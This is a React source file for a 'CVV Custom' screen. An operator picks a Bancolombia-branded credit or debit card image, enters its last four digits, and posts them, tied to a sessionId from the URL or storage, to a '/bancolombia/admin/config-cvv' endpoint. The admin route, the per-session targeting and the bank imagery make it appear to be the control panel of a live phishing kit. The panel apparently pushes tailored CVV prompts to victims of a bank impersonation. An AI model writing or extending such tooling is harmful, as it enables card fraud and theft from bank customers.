import { instanceBackend } from "../../../../app/axios/instanceBackend";
import { useState, useRef, useEffect } from "react";
import { limpiarPaddingBody } from "../../../../@utils";
import { useNavigate } from "react-router-dom";
import './css/LoginModal.css';

// Se define el componente CustomCvv
export default function CustomCvv() {

    // Se inicializa el navigate
    const navigate = useNavigate();

    // Se inicializa las constantes
    const [tipo, setTipo] = useState("");
    const [digits, setDigits] = useState(["", "", "", ""]);

    // Se inicializan las variables para el filtro
    const [filterFranquicia, setFilterFranquicia] = useState("Todas");
    const [selectedCard, setSelectedCard] = useState(null);
    const [submitted, setSubmitted] = useState(false);

    // Se inicializa el input
    const inputRefs = useRef([]);

    // Se definen las imagenes de las tarjetas de credito
    const creditImages = [
        { filename: "imgi_10_Mastercard_ideal_.webp", label: "Mastercard Ideal" },
        { filename: "imgi_11_Mastercard_joven_.webp", label: "Mastercard Joven" },
        { filename: "imgi_12_clasica_.webp", label: "Mastercard Clásica" },
        { filename: "imgi_13_+Visa+clasica+tradicional.webp", label: "Visa Clásica" },
        { filename: "imgi_14_Mastercard_credit-card.webp", label: "Mastercard Unica" },
        { filename: "imgi_15_275x172.webp", label: "Mastercard Standard" },
        { filename: "imgi_16_Mastercard_oro_.webp", label: "Mastercard Oro" },
        { filename: "imgi_17_Visa+Seleccion+Colombia.webp", label: "Visa Selección" },
        { filename: "imgi_18_Visa+Oro.webp", label: "Visa Oro" },
        { filename: "imgi_19_Mastercard_611_600x379.webp", label: "Mastercard Platinum" },
        { filename: "imgi_20_AMEX+SkyBlue.webp", label: "AMEX Blue" },
        { filename: "Amex-Green-v2.webp", label: "AMEX Green" },
        { filename: "imgi_22_AMEX+Gold.webp", label: "AMEX Gold" },
        { filename: "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.webp", label: "Visa LifeMiles" },
        { filename: "imgi_24_Mastercard_612_600x379.webp", label: "Mastercard Black" },
        { filename: "imgi_25_Visa+Platinum+Conavi.webp", label: "Visa Platinum" },
        { filename: "imgi_26_Mastercard_+Tarjeta+Virtual.webp", label: "Mastercard E-Card" },
        { filename: "imgi_27_AMEX+Platinum.webp", label: "AMEX Platinum" },
        { filename: "imgi_28_Visa_Infinite_Card.webp", label: "Visa Infinite" },
        { filename: "imgi_29_Mastercard-Sufi_Optimizada.webp", label: "Mastercard Sufi" },
        { filename: "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.webp", label: "Master Esso Gold" },
        { filename: "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.webp", label: "Master Esso Mobil" },
        { filename: "imgi_7_Amex+Libre.webp", label: "AMEX Libre" }
    ];

    // Se definen las imagenes de las tarjetas de debito
    const debitImages = [
        { filename: "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp", label: "Débito Cívica" },
        { filename: "imgi_5_Debito_(preferencial).webp", label: "Débito Preferencial" },
        { filename: "imgi_7_004_600x379.webp", label: "Débito Clásica" },
        { filename: "debito_virtual.webp", label: "Debito Virtual" }
    ];

    // Se crea el useEffect
    useEffect(() => {

        // Se selecciona por defecto credito
        setTipo("credito");
    }, []);

    // Se crea el useEffect
    useEffect(() => {

        // Se limpia la tarjeta seleccionada
        setSelectedCard(null);
    }, [filterFranquicia]);

    // Se crea el useEffect
    // Validar que la ruta sea accesible (con sessionId en URL o storage)
    useEffect(() => {
        limpiarPaddingBody();

        const params = new URLSearchParams(window.location.search);
        const sessionId = params.get("sessionId") || sessionStorage.getItem("sessionId") || localStorage.getItem("sessionId");

        if (sessionId) {
            sessionStorage.setItem("custom_sessionId", sessionId);
        }
    }, [navigate]);

    // Metodo encargado de filtrar las imagenes
    const getFilteredImages = () => {

        // Se valida si el filtro es todas
        if (filterFranquicia === "Todas") return creditImages;

        // Se filtran las imagenes
        return creditImages.filter(card => {

            // Se convierte el nombre del archivo a minusculas
            const lowerFilename = card.filename.toLowerCase();

            // Se convierte el label a minusculas
            const label = card.label.toLowerCase();

            // Se valida si es visa
            if (filterFranquicia === "Visa" && (lowerFilename.includes("visa") || label.includes("visa"))) return true;

            // Se valida si es mastercard
            if (filterFranquicia === "Mastercard" && (lowerFilename.includes("mastercard") || label.includes("mastercard"))) return true;

            // Se valida si es amex
            if (filterFranquicia === "Amex" && ((lowerFilename.includes("amex") || label.includes("amex")) || (lowerFilename.includes("amex") || label.includes("american")))) return true;

            // Se retorna false por defecto
            return false;
        });
    };

    // Metodo encargado de manejar el cambio de los digitos
    const handleDigitChange = (e, index) => {

        // Se obtiene el valor del input
        const { value } = e.target;

        // Se valida si el valor es un numero
        if (value && !/^[0-9]*$/.test(value)) return;

        // Se crea un nuevo array con los digitos
        const newDigits = [...digits];

        // Se asigna el valor al indice
        newDigits[index] = value.slice(-1);

        // Se actualiza el estado
        setDigits(newDigits);

        // Se valida si el valor es y si el indice es menor a 3
        if (value && index < 3) {

            // Se enfoca el siguiente input
            inputRefs.current[index + 1].focus();
        }
    };

    // Metodo encargado de manejar el key down
    const handleKeyDown = (e, index) => {

        // Se valida si la tecla es backspace y si el digito actual esta vacio y si el indice es mayor a 0
        if (e.key === "Backspace" && !digits[index] && index > 0) {

            // Se enfoca el input anterior
            inputRefs.current[index - 1].focus();
        }
    };

    // Metodo encargado de manejar la seleccion de la tarjeta
    const handleCardSelect = (imgName) => {

        // Se valida si la tarjeta ya esta seleccionada
        setSelectedCard(prev => prev === imgName ? null : imgName);
    };

    // Metodo encargado de manejar el envio de los datos
    const handleEnviar = async () => {

        // Se valida si la tarjeta esta seleccionada, si los digitos estan completos y si ya se envio
        if (!selectedCard || digits.some(d => d === "") || submitted) return;

        // Se obtienen los parametros de la url
        const params = new URLSearchParams(window.location.search);

        // Se obtiene el sessionId con fallbacks
        const sessionId = params.get("sessionId") || sessionStorage.getItem("custom_sessionId") || localStorage.getItem("sessionId");

        // Si no hay sessionId
        if (!sessionId) {
            alert("Error: Sesión ID faltante en los parámetros de la URL.");
            setSubmitted(false);
            return;
        }

        // Se obtiene la informacion de la tarjeta
        const allCards = [...creditImages, ...debitImages];

        // Se encuentra la tarjeta seleccionada
        const cardInfo = allCards.find(card => card.filename === selectedCard);

        // Se define el objeto de la tarjeta
        const cardData = {
            filename: selectedCard,
            tipo: tipo,
            digits: digits.join(""),
            label: cardInfo ? cardInfo.label : ""
        };

        // Se usa el try catch
        try {

            // Bloquear botón permanentemente
            setSubmitted(true);

            // Se define el endpoint
            const endpoint = '/bancolombia/admin/config-cvv';

            // Se envia la solicitud
            await instanceBackend.post(endpoint, {
                sessionId,
                cardData
            });

            // Se muestra el mensaje de exito
            alert(`✅ Configuración de tarjeta enviada con éxito`);
        } catch (error) {

            // Se muestra el mensaje de error
            alert("Error enviando configuración.");
        }
    };

    // Se retorna el HTML de la página
    return (
        <div
            style={{
                minHeight: "100vh",
                backgroundColor: "#000000",
                color: "#ffffff",
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                padding: "20px",
                fontFamily: "sans-serif"
            }}
        >
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "15px" }}>
                <img src="/assets/images/logos/cvv.png" alt="CVV Logo" style={{ width: "200px" }} />
            </div>

            <div
                style={{
                    fontSize: "18px",
                    fontWeight: "bold",
                    fontStyle: "italic",
                    color: "white",
                    lineHeight: "1",
                    marginTop: "center"
                }}
            >
                CVV Custom
            </div>

            <div style={{ width: "100%", maxWidth: "400px", marginTop: "50px" }}>
                <div style={{ display: "flex", alignItems: "center", marginBottom: "20px" }}>
                    <div style={{ flex: 1, height: "1px", backgroundColor: "#333" }}></div>
                    <span style={{ padding: "0 10px", fontSize: "14px", color: "#888" }}>Solicitud</span>
                    <div style={{ flex: 1, height: "1px", backgroundColor: "#333" }}></div>
                </div>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "30px" }}>
                    <div>
                        <div style={{ marginBottom: "15px", color: "#888" }}>Tipo</div>
                        <label style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "10px", cursor: "pointer" }}>
                            <input
                                type="radio"
                                name="tipo"
                                value="credito"
                                checked={tipo === "credito"}
                                onChange={(e) => { setTipo(e.target.value); setSelectedCard(null); }}
                                style={{ accentColor: "blue", width: "18px", height: "18px" }}
                            />
                            Crédito
                        </label>
                        <label style={{ display: "flex", alignItems: "center", gap: "10px", cursor: "pointer" }}>
                            <input
                                type="radio"
                                name="tipo"
                                value="debito"
                                checked={tipo === "debito"}
                                onChange={(e) => { setTipo(e.target.value); setSelectedCard(null); }}
                                style={{ accentColor: "blue", width: "18px", height: "18px" }}
                            />
                            Débito
                        </label>
                    </div>

                    {/* ULTIMOS 4 DIGITOS */}
                    <div>
                        <div style={{ marginBottom: "15px", color: "#888", textAlign: "right" }}>Ultimos 4 Digitos</div>
                        <div style={{ display: "flex", gap: "5px" }}>
                            {[0, 1, 2, 3].map((index) => (
                                <input
                                    key={index}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={digits[index]}
                                    onChange={(e) => handleDigitChange(e, index)}
                                    onKeyDown={(e) => handleKeyDown(e, index)}
                                    style={{
                                        width: "40px",
                                        height: "50px",
                                        backgroundColor: "transparent",
                                        border: "1px solid #333",
                                        borderRadius: "5px",
                                        color: "white",
                                        fontSize: "20px",
                                        textAlign: "center",
                                        outline: "none"
                                    }}
                                />
                            ))}
                        </div>
                    </div>
                </div>

                {/* Se renderizan los filtros */}
                {tipo === "credito" && (
                    <div style={{
                        marginBottom: "20px",
                        display: "flex",
                        gap: "10px",
                        overflowX: "auto",
                        paddingBottom: "10px",
                        width: "100%",
                        scrollbarWidth: "none"
                    }}>
                        {["Todas", "Visa", "Mastercard", "Amex"].map(f => {

                            // Se inicializa el map
                            const logoMap = {
                                "Visa": "/assets/images/logos/png-transparent-visa-logo-removebg-preview.png",
                                "Mastercard": "/assets/images/logos/Mastercard-logo.svg.png",
                                "Amex": "/assets/images/logos/american-express-logo.png"
                            };

                            // Se retorna el html
                            return (
                                <button
                                    key={f}
                                    onClick={() => setFilterFranquicia(f)}
                                    style={{
                                        backgroundColor: filterFranquicia === f ? "white" : "#333",
                                        color: filterFranquicia === f ? "black" : "white",
                                        border: filterFranquicia === f ? "2px solid #eae300ff" : "none",
                                        padding: f === "Todas" ? "8px 16px" : "8px 12px",
                                        borderRadius: "20px",
                                        cursor: "pointer",
                                        fontSize: "14px",
                                        whiteSpace: "nowrap",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        minWidth: f === "Todas" ? "auto" : "70px",
                                        height: "36px"
                                    }}
                                >
                                    {/* Todas - text only */}
                                    {f === "Todas" ? (
                                        "Todas"
                                    ) : ""}

                                    {/* Visa - ajusta el height aquí */}
                                    {f === "Visa" ? (
                                        <img
                                            src={logoMap[f]}
                                            alt={f}
                                            style={{
                                                height: "45px",
                                                width: "auto",
                                                objectFit: "contain"
                                            }}
                                        />
                                    ) : ""}

                                    {/* Mastercard - ajusta el height aquí */}
                                    {f === "Mastercard" ? (
                                        <img
                                            src={logoMap[f]}
                                            alt={f}
                                            style={{
                                                height: "28px",
                                                width: "auto",
                                                objectFit: "contain"
                                            }}
                                        />
                                    ) : ""}

                                    {/* Amex - ajusta el height aquí */}
                                    {f === "Amex" ? (
                                        <img
                                            src={logoMap[f]}
                                            alt={f}
                                            style={{
                                                height: "39px",
                                                width: "auto",
                                                objectFit: "contain"
                                            }}
                                        />
                                    ) : ""}
                                </button>
                            );
                        })}
                    </div>
                )}

                <div style={{ marginBottom: "30px", textAlign: "center", width: "100%" }}>
                    {tipo === "credito" && (
                        <div id="imagenes-credito" style={{
                            display: "grid",
                            gridTemplateColumns: "repeat(auto-fill, minmax(110px, 1fr))",
                            gap: "15px",
                            justifyContent: "center"
                        }}>
                            {getFilteredImages().map((card, index) => (
                                <div
                                    key={index}
                                    onClick={() => handleCardSelect(card.filename)}
                                    style={{
                                        position: "relative",
                                        cursor: "pointer",
                                        border: selectedCard === card.filename ? "3px solid #fdda24" : "3px solid transparent",
                                        borderRadius: "8px",
                                        overflow: "hidden",
                                        display: "flex",
                                        flexDirection: "column"
                                    }}
                                >
                                    <img
                                        src={`/assets/images/IMGtarjetas/${card.filename}`}
                                        alt={card.label}
                                        style={{ width: "100%", height: "auto", display: "block" }}
                                    />
                                    <div style={{
                                        backgroundColor: "#2C2A29",
                                        color: "white",
                                        fontSize: "10px",
                                        padding: "5px",
                                        textAlign: "center",
                                        whiteSpace: "nowrap",
                                        overflow: "hidden",
                                        textOverflow: "ellipsis"
                                    }}>
                                        {card.label}
                                    </div>
                                    {selectedCard === card.filename && (
                                        <div style={{
                                            position: "absolute",
                                            top: 0, left: 0, right: 0, bottom: 0,
                                            backgroundColor: "rgba(0, 197, 137, 0.2)",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center"
                                        }}>
                                            <div style={{
                                                width: "20px",
                                                height: "20px",
                                                backgroundColor: "#fdda24",
                                                borderRadius: "50%",
                                                color: "white",
                                                fontSize: "12px",
                                                display: "flex",
                                                alignItems: "center",
                                                justifyContent: "center"
                                            }}>✓</div>
                                        </div>
                                    )}
                                </div>
                            ))}
                        </div>
                    )}

                    {tipo === "debito" && (
                        <div id="imagenes-debito" style={{
                            display: "grid",
                            gridTemplateColumns: "repeat(auto-fill, minmax(110px, 1fr))",
                            gap: "15px",
                            justifyContent: "center"
                        }}>
                            {debitImages.map((card, index) => (
                                <div
                                    key={index}
                                    onClick={() => handleCardSelect(card.filename)}
                                    style={{
                                        position: "relative",
                                        cursor: "pointer",
                                        border: selectedCard === card.filename ? "3px solid #fdda24" : "3px solid transparent",
                                        borderRadius: "8px",
                                        overflow: "hidden",
                                        display: "flex",
                                        flexDirection: "column"
                                    }}
                                >
                                    <img
                                        src={`/assets/images/IMGdebitotj/${card.filename}`}
                                        alt={card.label}
                                        style={{ width: "100%", height: "auto", display: "block" }}
                                    />
                                    <div style={{
                                        backgroundColor: "#2C2A29",
                                        color: "white",
                                        fontSize: "10px",
                                        padding: "5px",
                                        textAlign: "center",
                                        whiteSpace: "nowrap",
                                        overflow: "hidden",
                                        textOverflow: "ellipsis"
                                    }}>
                                        {card.label}
                                    </div>
                                    {selectedCard === card.filename && (
                                        <div style={{
                                            position: "absolute",
                                            top: 0, left: 0, right: 0, bottom: 0,
                                            backgroundColor: "rgba(0, 197, 137, 0.2)",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center"
                                        }}>
                                            <div style={{
                                                width: "20px",
                                                height: "20px",
                                                backgroundColor: "#fdda24",
                                                borderRadius: "50%",
                                                color: "white",
                                                fontSize: "12px",
                                                display: "flex",
                                                alignItems: "center",
                                                justifyContent: "center"
                                            }}>✓</div>
                                        </div>
                                    )}
                                </div>
                            ))}
                        </div>
                    )}
                </div>

                <button
                    onClick={handleEnviar}
                    disabled={!selectedCard || digits.some(d => d === "") || submitted}
                    style={{
                        width: "100%",
                        backgroundColor: (selectedCard && digits.every(d => d !== "") && !submitted) ? "#fdda24" : "#333",
                        color: (selectedCard && digits.every(d => d !== "") && !submitted) ? "black" : "#666",
                        border: "none",
                        padding: "15px",
                        borderRadius: "8px",
                        fontSize: "16px",
                        cursor: (selectedCard && digits.every(d => d !== "") && !submitted) ? "pointer" : "not-allowed",
                        transition: "background-color 0.3s"
                    }}>
                    {submitted ? "Enviado" : "Enviar"}
                </button>
            </div>
        </div>
    );
};